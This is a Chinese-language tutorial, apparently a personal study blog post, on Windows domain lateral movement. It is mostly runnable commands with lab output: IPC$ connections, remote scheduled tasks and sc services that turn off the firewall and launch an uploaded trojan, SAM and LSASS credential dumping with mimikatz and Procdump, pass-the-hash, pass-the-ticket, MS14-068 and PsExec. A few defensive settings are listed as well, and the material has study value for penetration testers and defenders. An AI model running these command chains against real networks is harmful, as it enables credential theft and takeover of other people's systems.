<h2 id="五：令牌窃取分析及防范"><a href="#五：令牌窃取分析及防范" class="headerlink" title="五：令牌窃取分析及防范"></a>五：令牌窃取分析及防范</h2><p>令牌（Token）是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求时属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭据的情况下访问网络和系统资源。这些令牌将持续存在于系统中（除非系统重启）。<br>令牌具有随机性和不可预测性，常见令牌类型：</p>
<p>访问令牌：代表访问控制操作主体的系统对象<br>密保令牌：也叫做认证令牌或者硬件令牌，是一种用于实现计算机身份校验的设备，例如U盾<br>会话令牌：交互会话中唯一的身份标识符<br>伪造令牌攻击的核心是Kerberos协议，它支持两种令牌：</p>
<p>授权令牌（Delegation Tokens）：支持交互式登录<br>模拟令牌（Impersonation Tokens）：支持非交互式的会话<br>1.工具</p>
<p>metasploit的use incognito<br>Rotten Patato本地提权(烂土豆提权)<br>Empire的mimikatz</p>
<h2 id="六：无凭证条件下的权限获取分析及防范"><a href="#六：无凭证条件下的权限获取分析及防范" class="headerlink" title="六：无凭证条件下的权限获取分析及防范"></a>六：无凭证条件下的权限获取分析及防范</h2><p>1.LLMNR</p>
<p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，直到DNS服务器回复正常为止。LLMNR支持IPv6</p>
<p>LLMNR工作流程如下：</p>
<p>DNS客户端在自己的内部名称缓存中查询名称<br>如果没有找到，主机将向主DNS发送名称查询请求<br>如果主DNS没有回应或收到了错误的信息，主机会向备DNS发送查询请求<br>如果备DNS没有回应或收到了错误的消息，将使用LLMNR进行解析<br>主机通过UDP协议向组播地址224.0.0.252的5335端口发送多播查询请求，以获取主机名所对应的IP地址.范围仅限于本地子网。<br>本地子网中所有支持LLMNR的主机在收到查询请求后，会对比自己的主机名，如果不同，就丢弃；如果相同，就向查询主机发送包含自己IP地址的单播信息<br>2.NetBIOS<br>NetBIOS是一种网络协议，一般用在局域网中，提供的三种服务如下：</p>
<p>NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报。该服务需要使用域名服务器来注册NetBIOS的名称，默认监听UDP137端口，也可以使用TCP137端口<br>Datagram Distribution Service（数据分布服务）：无连接服务。该服务负责进行错误检测和恢复，默认监听UDP138端口<br>Session Service（会话服务）：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。默认使用TCP139端口<br>3.Net-NTLM</p>
<p>NTLM Hash是指Windows操作系统的Security Account Manager中保存的密码散列值<br>Net-NTLM Hash是指在网络环境中国经过NTLM认证的散列值<br>4.LLMNR和NetBIOS欺骗</p>
<h1 id="横向移动分析和防御"><a href="#横向移动分析和防御" class="headerlink" title="横向移动分析和防御"></a>横向移动分析和防御</h1><p><strong>横向移动原理</strong></p>
<p>在渗透测试中拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH（凭据传递）的方法，将散列值或者明文密码传送到目标主机进行验证，与目标主机建立连接后，可以使用相关方法在远程Windows操作系统中执行命令</p>
<p>在实际的网络环境中，针对此类情况，网络管理人员可以通过配置Windows系统自带的防火墙或组策略进行防御</p>
<h2 id="一：IPC远程连接及相关命令"><a href="#一：IPC远程连接及相关命令" class="headerlink" title="一：IPC远程连接及相关命令"></a>一：IPC远程连接及相关命令</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>IPC共享命名管道，为了实现进程间通信而开放命名的管道。IPC可以通过验证用户和密码获取相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
<p>通过IPC可以与目标机器建立连接。利用这个连接不仅可以访问目标机器中的文件，进行上传下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构.用户列表等信息</p>
<h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul>
<li>开启139.445端口</li>
<li>管理员开启默认共享</li>
</ul>
<h3 id="3-使用Windows自带的工具获取远程主机信息"><a href="#3-使用Windows自带的工具获取远程主机信息" class="headerlink" title="3.使用Windows自带的工具获取远程主机信息"></a>3.使用Windows自带的工具获取远程主机信息</h3><h4 id="1-建立删除"><a href="#1-建立删除" class="headerlink" title="1) 建立删除"></a>1) 建立删除</h4><p>建立一个ipc</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">1.3</span>\ipc<span class="variable">$ </span><span class="string">&quot;密码&quot;</span> /<span class="symbol">user:</span>账号</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700128.png" alt="img"></p>
<p>net use 查看已经建立的连接</p>
<p> <img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700456.png" alt="img"></p>
<p>删除ipc连接</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span>\ipc$ /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>

<p>　　</p>
<h4 id="2-dir命令"><a href="#2-dir命令" class="headerlink" title="2) dir命令"></a>2) dir命令</h4><p>建立ipc连接后列出远程主机中的文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span>  \\ip地址\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700937.png" alt="img"></p>
<p> 还有一种方法更便捷</p>
<p>将目标主机的c盘映射到本地z盘</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">net</span> use z: \\<span class="number">192.168.1.3</span>\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700699.png" alt="img"></p>
<h4 id="3-tasklist任务"><a href="#3-tasklist任务" class="headerlink" title="3) tasklist任务"></a>3) tasklist任务</h4><p>使用tasklist命令的&#x2F;S（IP地址）.&#x2F;U（账号）.&#x2F;P（密码）参数列出远程主机上运行的进程</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S <span class="number">192.168</span>.<span class="number">1.3</span> /U <span class="keyword">user</span> <span class="title">/P</span> password</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700574.png" alt="img"></p>
<h4 id="4-at命令计划任务"><a href="#4-at命令计划任务" class="headerlink" title="4) at命令计划任务"></a>4) at命令计划任务</h4><p>（1）首先使用net time确定远程主机当前系统时间</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700022.png" alt="img"></p>
<p>（2）使用copy命令将payload文件复制到远程目标机器中</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">copy</span> calc.bat \\<span class="number">192.168.1.3</span>\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700776.png" alt="img"></p>
<p>（3）使用at创建计划任务</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">at</span> \\<span class="number">192.168.1.3</span> <span class="number">13</span>:<span class="number">56</span> C:\calc.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700620.png" alt="img"></p>
<p>等待时间到了就会自动执行</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700305.png" alt="img"></p>
<p>（4）使用at远程执行命令</p>
<p>先将执行结果写入本地文本文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">at</span> \\<span class="number">192.168.1.3</span> <span class="number">14</span>:<span class="number">09</span> cmd.exe /c <span class="string">&quot;ipconfig &gt;C:/1.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700109.png" alt="img"></p>
<p>使用type读取</p>
<p> <img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700651.png" alt="img"></p>
<p> （5）清除at记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.3 3 /delete //ip加计划任务的<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700028.png" alt="img"></p>
<h4 id="5-schtasks命令计划任务"><a href="#5-schtasks命令计划任务" class="headerlink" title="5) schtasks命令计划任务"></a>5) schtasks命令计划任务</h4><p>win2008及之后的版本的操作系统已经将at命令废弃了，于是攻击者开始用schtasks代替at命令　</p>
<p>在远程主机创建一个名为test的计划任务。该计划任务在开机时启动，启动程序为C盘下的calc.bat，启动权限为System</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.3 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f</span><br></pre></td></tr></table></figure>

<p> 使用schtasks命令时若已经建立了ipc连接则不需要输密码，若没建立</p>
<p>&#x2F;u：账号</p>
<p>&#x2F;p：密码</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701710.png" alt="img"></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701372.png" alt="img"></p>
<p>或者创建定时任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.3 /tn <span class="built_in">test</span> /sc once /st 17:07 /tr c:\calc.bat /ru system /f /u administrator /p Lirenyu579　　</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jataflf/article/details/52788280">Schtasks命令详解</a></p>
<h3 id="4-sc创建任务"><a href="#4-sc创建任务" class="headerlink" title="4.sc创建任务"></a>4.sc创建任务</h3><p>后续的学习中发现计划任务大多数的时候都没有权限，但也认识了sc这个命令</p>
<p>sc创建任务把防火墙远程关掉</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">64</span> create unablefirewall <span class="keyword">binpath= </span><span class="string">&quot;netsh advfirewall set allprofiles state off&quot;</span></span><br><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">64</span> start unablefirewall</span><br></pre></td></tr></table></figure>

<p>sc创建任务执行上传的木马</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">64</span> create Startup <span class="keyword">binpath= </span><span class="string">&quot;C:\360.exe&quot;</span></span><br><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">64</span> start Startup</span><br></pre></td></tr></table></figure>

<h2 id="二：Windows散列值获取分析"><a href="#二：Windows散列值获取分析" class="headerlink" title="二：Windows散列值获取分析"></a>二：Windows散列值获取分析</h2><p> Windows操作系统中的密码一般由两部分组成，一部分为LM Hash ，另一部分为NTLM Hash。</p>
<p>LM Hash本质是DES加密，较易破解，但为了保证系统的兼容性，Windows只是将LM Hash禁用了，从win vista和win2008版本开始默认禁用。如果LM Hash被禁用，攻击者抓取的LM Hash通常为：aad3b435b51404eeaad3b435b51404ee</p>
<p>NTLM Hash基于MD4加密，个人版windows vista。服务器版win2003之后的认证方式都是NTLM Hash</p>
<h3 id="1-单机密码抓取与防范"><a href="#1-单机密码抓取与防范" class="headerlink" title="1.单机密码抓取与防范"></a>1.单机密码抓取与防范</h3><p> 想要抓取散列值或密码需要system权限</p>
<p>散列值和其他安全验证信息都保存在sam文件中。lsass.exe进程用于实现windows的安全策略，可以使用工具将散列值和密码从内存中的lsass.exe进程或sam文件导出。sam文件保存在windows&#x2F;system32&#x2F;config，该文件是锁定的不可复制。但在渗透测试中可以等关闭windows系统后，使用PE盘进入文件管理环境，直接复制sam文件</p>
<h3 id="2-通过SAM和System文件抓取密码"><a href="#2-通过SAM和System文件抓取密码" class="headerlink" title="2.通过SAM和System文件抓取密码"></a>2.通过SAM和System文件抓取密码</h3><p>（1）首先无工具导出sam文件</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="built_in">save</span> hklm\sam sam.hive </span><br><span class="line">reg <span class="built_in">save</span> hklm\<span class="built_in">system</span> <span class="built_in">system</span>.hive</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701537.png" alt="img"></p>
<p> （2）使用mimikatz读取获得NTLM Hash</p>
<p>将刚刚导出的文件和mimiKatz放在同一目录下，运行mimikatz</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">lsadump::sam</span> /sam:sam.hive /<span class="params">system</span>:<span class="params">system</span>.hive</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701302.png" alt="img"></p>
<h3 id="3-使用mimikatz在线读取sam文件"><a href="#3-使用mimikatz在线读取sam文件" class="headerlink" title="3.使用mimikatz在线读取sam文件"></a>3.使用mimikatz在线读取sam文件</h3><p>管理员运行，在mimikatz目录打开命令行</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701706.png" alt="img"></p>
<h3 id="4-使用mimikatz离线读取lsass-dmp文件"><a href="#4-使用mimikatz离线读取lsass-dmp文件" class="headerlink" title="4.使用mimikatz离线读取lsass.dmp文件"></a>4.使用mimikatz离线读取lsass.dmp文件</h3><p>（1）使用Procdump导出lsass.dmp文件</p>
<p>Procdump是微软官方的 工具，可在命令行将lsass导出，且杀软不会拦截</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump.<span class="keyword">exe</span> -accepteula -<span class="keyword">ma</span> lsass.<span class="keyword">exe</span> lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701204.png" alt="img"></p>
<p> （2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
<p>导入lsass.dmp文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;sekurlsa::minidump lsass.DMP&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701170.png" alt="img"></p>
<p> （3）导出密码散列值</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa<span class="type">::logonPasswords</span> <span class="literal">full</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701810.png" alt="img"></p>
<h3 id="5-使用PowerShell对散列值进行Dump操作"><a href="#5-使用PowerShell对散列值进行Dump操作" class="headerlink" title="5.使用PowerShell对散列值进行Dump操作"></a>5.使用PowerShell对散列值进行Dump操作</h3><p>使用Nishang中的Get-PassHashes.ps1</p>
<p>先导入nishang</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> .\nishang.psm1</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701867.png" alt="img"></p>
<h2 id="三：单机密码抓取防范"><a href="#三：单机密码抓取防范" class="headerlink" title="三：单机密码抓取防范"></a>三：单机密码抓取防范</h2><h3 id="1-Wdigest防止明文密码泄露"><a href="#1-Wdigest防止明文密码泄露" class="headerlink" title="1.Wdigest防止明文密码泄露"></a>1.Wdigest防止明文密码泄露</h3><p>微软为了防止明文密码泄露发布了补丁KB2871997，关闭了Wdigest功能。Windows server2012以上默认关闭。　　</p>
<p>开启Wdigest Auth</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t Reg_DWORD /d 1 /f</span></span><br></pre></td></tr></table></figure>

<p>关闭Wdigest Auth</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t Reg_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure>

<p> 查询</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential　　</span><br></pre></td></tr></table></figure>

<p>设置了之后，使用mimikatz就只能抓取NTLM Hash，不能获取明文密码　　</p>
<h3 id="2-设置Active-Directory-2012-R2功能级别"><a href="#2-设置Active-Directory-2012-R2功能级别" class="headerlink" title="2.设置Active Directory 2012 R2功能级别"></a>2.设置Active Directory 2012 R2功能级别</h3><p>windows server 2012新增了一个名为受保护的用户的用户组，只要将用户放入改组，攻击者就无法使用mimikatz等工具抓取密码及散列值</p>
<p>　<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701684.png" alt="img"></p>
<h3 id="3-防御mimikatz攻击"><a href="#3-防御mimikatz攻击" class="headerlink" title="3.防御mimikatz攻击"></a>3.防御mimikatz攻击</h3><p>mimikatz在抓取密码及散列值时需要使用Debug权限，因为mimikatz需要与lsass进程进行交互，如果没有debug权限就不能读取lsass。</p>
<p>因此可以将拥有debug权限的管理员从administrators组中删除，mimikatz无法获取debug权限将无法使用</p>
<h2 id="四：哈希传递攻击（PTH-PTK）"><a href="#四：哈希传递攻击（PTH-PTK）" class="headerlink" title="四：哈希传递攻击（PTH.PTK）"></a>四：哈希传递攻击（PTH.PTK）</h2><p>在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码，因此如果攻击者获取了一台计算机的NTLM Hash值，就可以通过哈希传递攻击的方式登陆到内网中的其他机器</p>
<h3 id="1-使用NTLM-Hash进行哈希传递攻击"><a href="#1-使用NTLM-Hash进行哈希传递攻击" class="headerlink" title="1.使用NTLM Hash进行哈希传递攻击"></a>1.使用NTLM Hash进行哈希传递攻击</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:hacke /ntlm:3f57163975979b7a85ff54a641a63b2d&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701603.png" alt="img"></p>
<p> 列出域控制器c盘的内容</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701206.png" alt="img"></p>
<p>若无法传递可以尝试 修改注册表</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span><span class="language-bash"> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span></span><br></pre></td></tr></table></figure>

<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="2-使用AES-256密钥进行哈希传递攻击"><a href="#2-使用AES-256密钥进行哈希传递攻击" class="headerlink" title="2.使用AES-256密钥进行哈希传递攻击"></a>2.使用AES-256密钥进行哈希传递攻击</h3><p>使用mimikatz抓取AES-256密钥</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702402.png" alt="img"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:hacke /aes256:00efd5d3f7e68e667fbc16d1691270faa6ca32c8bb6b0516ec602b7205fb4110&quot;</span></span><br></pre></td></tr></table></figure>

<p> 但是将密钥导入之后仍然不能访问远程主机。这是因为必须要在目标机器上安装KB2871997，才可以通过aes-256横向移动</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702137.png" alt="img">　　</p>
<h2 id="五：票据传递攻击（PTT）"><a href="#五：票据传递攻击（PTT）" class="headerlink" title="五：票据传递攻击（PTT）"></a>五：票据传递攻击（PTT）</h2><h3 id="1-mimkatz导出票据"><a href="#1-mimkatz导出票据" class="headerlink" title="1.mimkatz导出票据"></a>1.mimkatz导出票据</h3><p>使用mimikatz将内存中的票据导出</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702833.png" alt="img"></p>
<p> 当前目录会出现多个服务的票据文件</p>
<p>使用mimikatz清除内存中的票据</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge  \\清除票据</span><br><span class="line">kerberos::tgt   \\查看票据</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702363.png" alt="img"></p>
<p>将票据文件注入内存，选择@krbtgt文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">&quot;kerberos::ptt &quot;</span>C:\Users\administrator.WIN-<span class="number">2008</span>\Desktop\x64\[<span class="number">0</span>;<span class="number">3</span>e4]-<span class="number">2</span>-<span class="number">1</span>-<span class="number">40</span>e10000-WIN-<span class="number">2008</span>$@krbtgt-HACKE.TESTLAB.kirbi<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702292.png" alt="img"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">&quot;kerberos::ptt &quot;</span>C:\Users\testuser\Desktop\x64\[<span class="number">0</span>;<span class="number">123</span>ff2]-<span class="number">2</span>-<span class="number">0</span>-<span class="number">60</span>a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p> 但这里我没成功，没有administrator的票据。后面试了一下如果登陆administrator用户可以直接访问远程dc，再次切换回来低权限的用户testuer之后，拿到了administrator的票据，也成功访问了dc。但这里还是需要管理员的权限来导出票据</p>
<h3 id="2-利用ms14-068漏洞"><a href="#2-利用ms14-068漏洞" class="headerlink" title="2.利用ms14-068漏洞"></a>2.利用ms14-068漏洞</h3><p>这种方法不需要管理员的权限就能实现普通用户直接获取域控system权限　　</p>
<p>首先whoami &#x2F;user 查看sid</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702808.png" alt="img"></p>
<p> 第二步用mimikatz清除票据</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge  \\清除票据</span><br><span class="line">kerberos::tgt   \\查看票据</span><br></pre></td></tr></table></figure>

<p>或者cmd清除</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge <span class="string">\\清除klist</span>    <span class="string">\\查看</span></span><br></pre></td></tr></table></figure>

<p>第三步利用ms14-068生成TGT数据</p>
<p> ms14-068.exe -u域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ms14</span>-<span class="number">068</span>.exe -u testuser@hacke.testlab -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">954094320</span>-<span class="number">202977030</span>-<span class="number">1482179831</span>-<span class="number">1105</span> -d <span class="number">192.168.1.1</span> -p xxxxxxxx</span><br></pre></td></tr></table></figure>

<p> 第四步用mimikatz将生成的票据注入内存</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">kerberos</span>::ptc <span class="name">C</span>:\Users\testuser\Desktop\TGT_testuser@hacke.testlab.ccache</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702266.png" alt="img"></p>
<p> 这里我的域控版本比较高应该是打了补丁的，所以没成功。</p>
<p>　　</p>
<h2 id="六：PsExec的使用"><a href="#六：PsExec的使用" class="headerlink" title="六：PsExec的使用"></a>六：PsExec的使用</h2><p>Psexec起初用于大批量Windows主机的运维，在域环境下效果很好。但攻击者渐渐开始使用PsExec通过命令行环境与目标机器连接，甚至控制目标机器，且不需要通过远程桌面协议进行图形化控制，降低了恶意操作被管理员发现的可能性。（PsExec是windows提供的工具，所以杀软将其列在白名单中）</p>
<h3 id="1-PsTools工具包中的PsExec"><a href="#1-PsTools工具包中的PsExec" class="headerlink" title="1.PsTools工具包中的PsExec"></a>1.PsTools工具包中的PsExec</h3><p>在建立了ipc$（administrator）的情况下执行如下命令，获取System权限的shell</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.<span class="keyword">exe</span> -accepteula -s \\<span class="number">192.168</span>.<span class="number">1.3</span> cmd.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p>-accepteula 确认参数，使用该参数不会弹出确认框</p>
<p>-s 以system权限运行，获得system权限的交互式shell，否则就是administrator权限</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702661.png" alt="img"></p>
<p>若没建立ipc$连接，可以使用-u -p参数连接 </p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula -s \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span> -u administrator -p admini!@<span class="meta"># <span class="keyword">cmd</span>.exe</span></span><br></pre></td></tr></table></figure>

<p>　　</p>
<h3 id="2-Metasploit中的PsExec"><a href="#2-Metasploit中的PsExec" class="headerlink" title="2.Metasploit中的PsExec"></a>2.Metasploit中的PsExec</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702211.png" alt="img"></p>
<p> 使用第九个 exploit&#x2F;windows&#x2F;smb&#x2F;psexec　　</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options <span class="regexp">//</span>查看参数set rhost <span class="number">192.168</span>.<span class="number">200.24</span> <span class="regexp">//i</span>pset smbuser administrator <span class="regexp">//</span>账户set smbpass admin!@<span class="comment"># //密码</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702835.png" alt="img"></p>
<p>返回system权限 </p>
